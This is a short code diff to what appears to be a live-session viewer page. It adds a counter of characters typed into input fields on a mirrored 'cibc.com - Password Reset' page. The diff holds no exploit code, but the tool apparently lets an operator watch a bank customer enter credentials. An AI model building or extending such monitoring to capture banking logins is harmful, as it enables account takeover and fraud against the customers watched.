@@ -266,6 +266,23 @@
       font-size: 13px;
     }
 
+    .char-count {
+      background: #334155;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      color: #94a3b8;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .char-count-num {
+      color: #22c55e;
+      font-weight: 600;
+      font-family: 'Courier New', monospace;
+    }
+
     .end-btn {
       background: transparent;
       color: #ef4444;
@@ -513,6 +530,10 @@
             LIVE
           </div>
           <span class="viewer-url">Viewing: cibc.com - Password Reset</span>
+          <div class="char-count">
+            <span>Characters typed:</span>
+            <span class="char-count-num" id="charCount">0</span>
+          </div>
         </div>
         <button class="end-btn" onclick="endSession()">End Session</button>
       </div>
@@ -677,6 +698,16 @@
       document.getElementById('disconnectedOverlay').classList.add('hidden');
 
       const iframe = document.getElementById('client-frame');
+
+      // Count characters from input fields
+      const tempDiv = document.createElement('div');
+      tempDiv.innerHTML = html;
+      let totalChars = 0;
+      tempDiv.querySelectorAll('input, textarea').forEach(input => {
+        const val = input.getAttribute('value') || '';
+        totalChars += val.length;
+      });
+      document.getElementById('charCount').textContent = totalChars;
 
       // Write the full HTML to the iframe
       iframe.contentDocument.open();
